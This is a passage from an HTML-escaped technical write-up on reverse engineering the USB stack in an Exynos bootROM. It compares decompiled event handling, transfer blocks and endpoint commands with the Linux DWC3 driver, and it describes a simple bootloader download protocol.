    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;parameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// Parameters of the current event&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;__packed&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_event_devt&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// Device Events&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;is_devspec&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// indicates this is a non-endpoint event (device-specific)&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;device_event&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// indicates it&amp;#39;s a device event&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// type of device event&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;reserved15_12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;event_info&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// Information about this event&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;reserved31_25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;__packed&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;USB events count&lt;/h2&gt;
&lt;p&gt;Register &lt;strong&gt;DWC3_GEVNTCOUNT&lt;/strong&gt; (updated by USB controller) contains the count of events pending in event buffer. BootROM code implements a simple function (named &lt;em&gt;read_DWC3_GEVNTCOUNT&lt;/em&gt; here) to read this register :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="nf"&gt;read_DWC3_GEVNTCOUNT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;eventCnt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;eventCnt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cRead_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTCOUNT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;short&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;eventCnt&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Again, we located that function by looking at references to &lt;strong&gt;DWC3_GEVNTCOUNT&lt;/strong&gt; register.&lt;/p&gt;
&lt;h2&gt;USB event handler&lt;/h2&gt;
&lt;p&gt;By inspecting incoming function calls in Ghidra, we can now easily locate the main function that processes USB events :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_event_handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;dwc3_event&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;evtCnt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;evtCnt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read_DWC3_GEVNTCOUNT&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="c1"&gt;//read pending events count from DWC3_GEVNTCOUNT register&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;evtCnt&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;evtCnt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// loop while pending events available&lt;/span&gt;
      &lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USBBuffers_ptr&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;event_buffer&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;usbEventIdx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// read event from event buffer&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// evt.is_devspec == 0 : event is endpoint-specific&lt;/span&gt;
          &lt;span class="n"&gt;epNum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x1f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// extract endpoint_number from event&lt;/span&gt;
          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;epNum&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// endpoint 0 (bit 0 of endpoint_number is direction: 0=&amp;gt;OUT, 1=&amp;gt;IN)&lt;/span&gt;
            &lt;span class="n"&gt;usb_handle_ep0_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
          &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;//other endpoints&lt;/span&gt;
            &lt;span class="n"&gt;usb_handle_ep_event&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ulonglong&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;epNum&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),(&lt;/span&gt;&lt;span class="n"&gt;ulonglong&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xf&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// evt.is_devspec == 1 : event is device-specific&lt;/span&gt;
          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xfe&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;usb_handle_device_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="n"&gt;usbEventIdx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;usbEventIdx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x1f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="n"&gt;write_DWC3_GEVNTCOUNT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;evtCnt&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instead of relying on interrupts like in Linux driver, this handler implements a polling loop to check for new events in event buffer. Then, events are dispatched to three different functions depending on their type :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;usb_handle_device_event&lt;/em&gt; : device-level events like (dis)connect USB cable, reset, link status change,...&lt;/li&gt;
&lt;li&gt;&lt;em&gt;usb_handle_ep0_event&lt;/em&gt; : default control endpoint 0 to enumerate &amp;amp; configure device&lt;/li&gt;
&lt;li&gt;&lt;em&gt;usb_handle_ep_event&lt;/em&gt; : dispatch events related to other endpoints, including bulk endpoints&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The latter &lt;em&gt;usb_handle_ep_event&lt;/em&gt; is the one we're interested in, because it handles data received from USB host (i.e. bootloader image).
In this function, a dispatch table calls a handler specific to each endpoint number. The only implemented handler in this table is for endpoint 2.
Based on configuration descriptors detailed above, we can confirm that endpoint 2 is for BULK OUT (host to device) transfers.&lt;/p&gt;
&lt;h2&gt;Transfer Request Blocks&lt;/h2&gt;
&lt;p&gt;Events described in the previous sections are only 32-bit values, they don't contain payload data. Actual data transfers are setup using &lt;strong&gt;Transfer Request Blocks&lt;/strong&gt; (TRB)&lt;/p&gt;
&lt;p&gt;A TRB is a structure that directs the USB controller where to write (or read, depending on endpoint direction) data for the next transfer on a specific endpoint.
The buffer has to be DMA coherent memory directly accessible by both main CPU and USB controller.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cm"&gt;/** struct dwc3_trb - transfer request block (hw format) */&lt;/span&gt;
&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_trb&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt;     &lt;span class="n"&gt;bpl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// buffer pointer (low)&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt;     &lt;span class="n"&gt;bph&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// buffer pointer (high)&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt;     &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// buffer len&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt;     &lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// control bitfield&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Linux driver function &lt;em&gt;dwc3_ep0_start_trans&lt;/em&gt; is a good example of how to initiate a data transfer using a TRB :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;dwc3_ep0_start_trans&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;u8&lt;/span&gt; &lt;span class="n"&gt;epnum&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dma_addr_t&lt;/span&gt; &lt;span class="n"&gt;buf_dma&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_gadget_ep_cmd_params&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_trb&lt;/span&gt;         &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_ep&lt;/span&gt;          &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;dep&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;dep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;eps&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;epnum&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="n"&gt;trb&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ep0_trb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bpl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lower_32_bits&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf_dma&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bph&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;upper_32_bits&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf_dma&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ctrl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="p"&gt;[...]&lt;/span&gt;

    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;param0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;upper_32_bits&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ep0_trb_addr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;param1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lower_32_bits&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ep0_trb_addr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;dwc3_send_gadget_ep_cmd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dep&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;DWC3_DEPCMD_STARTTRANSFER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First, &lt;strong&gt;trb&lt;/strong&gt; structure is filled using buffer address and its size provided in function parameters. Then, &lt;strong&gt;DWC3_DEPCMD_STARTTRANSFER&lt;/strong&gt; command is issued to USB controller with TRB pointer and endpoint number as arguments.&lt;/p&gt;
&lt;p&gt;Back to bootROM code, identifying where TRBs are set is an important step towards our goal. It can lead us to buffers (corresponding to &lt;em&gt;buf_dma&lt;/em&gt; here) used for data transfers. Among them, we're especially interested in those used for endpoint 2 (BULK OUT), because they are read back by the code we're ultimately interested in : vendor-specific protocol handlers.&lt;/p&gt;
&lt;p&gt;Again, we rely on hardware register accesses performed by &lt;em&gt;dwc3_send_gadget_ep_cmd&lt;/em&gt; to locate bootROM functions that can send command &lt;strong&gt;DWC3_DEPCMD_STARTTRANSFER&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Send USB command&lt;/h2&gt;
&lt;p&gt;In Linux driver, the function to send USB commands &lt;em&gt;dwc3_send_gadget_ep_cmd&lt;/em&gt; is the only one to access registers &lt;strong&gt;DWC3_DEPCMDPAR0&lt;/strong&gt;, &lt;strong&gt;DWC3_DEPCMDPAR1&lt;/strong&gt;, &lt;strong&gt;DWC3_DEPCMDPAR2&lt;/strong&gt;, &lt;strong&gt;DWC3_DEPCMD&lt;/strong&gt;. And so it is with bootROM. By comparing both, we can deduce the bootROM function prototype :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;usb_send_command&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;endpointNumber&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;DWC3_DEPCMD_e&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;param0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;param1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here's the list of commands defined in Linux driver code :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cm"&gt;/* Device Endpoint Command Register */&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_DEPSTARTCFG     (0x09 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_ENDTRANSFER     (0x08 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_UPDATETRANSFER  (0x07 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_STARTTRANSFER   (0x06 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_CLEARSTALL      (0x05 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_SETSTALL        (0x04 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_GETSEQNUMBER    (0x03 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_GETEPSTATE      (0x03 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_SETTRANSFRESOURCE   (0x02 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_SETEPCONFIG     (0x01 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;From there, we can explore all incoming function calls to &lt;em&gt;usb_send_command&lt;/em&gt; and use the command argument as hint to ease the reversing.&lt;/p&gt;
&lt;p&gt;As explained in previous section, we're especially interested in finding calls with command argument &lt;strong&gt;DWC3_DEPCMD_STARTTRANSFER&lt;/strong&gt;, because they setup the TRB for a specific endpoint. In case of endpoint 2 (BULK OUT), the TRB contains the buffer address where data received from USB host will be written to.&lt;/p&gt;
&lt;p&gt;With these last bits, we now have enough information to move on to the next level, our initial goal.&lt;/p&gt;
&lt;h1&gt;Protocol level&lt;/h1&gt;
&lt;p&gt;In previous sections, we collected the following information :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;interface configuration : USB interface class &lt;em&gt;bInterfaceClass&lt;/em&gt; is vendor-specific (0xff)&lt;/li&gt;
&lt;li&gt;endpoint configuration : endpoint 2 (BULK OUT) is expected to receive data.&lt;/li&gt;
&lt;li&gt;TRB setup for transfer buffer : we know where received data is stored.&lt;/li&gt;
&lt;li&gt;endpoint handlers : we identified the handler function for each endpoint.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The vendor-specific interface class indicates that endpoint handler implements a proprietary protocol. Fortunately, a very simple protocol designed to download a bootloader from USB host.&lt;/p&gt;
&lt;p&gt;The bootloader is encapsulated in a small structure &lt;em&gt;dldata_s&lt;/em&gt;, and sent through USB bulk transfers of 512 bytes. Maximum data size is 321536 bytes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dldata_s&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;unknown0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// header(8) + data(n) + footer(2)&lt;/span&gt;
    &lt;span class="n"&gt;u_int8_t&lt;/span&gt;  &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;u_int16_t&lt;/span&gt; &lt;span class="n"&gt;unknown1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;//footer&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Despite the lack of documentation for the USB controller, we extracted enough technical information from Linux kernel drivers to reverse engineer USB stack implemented in Exynos bootROM. We concluded that this stack implements a single, proprietary interface to download a bootloader from USB host.&lt;/p&gt;
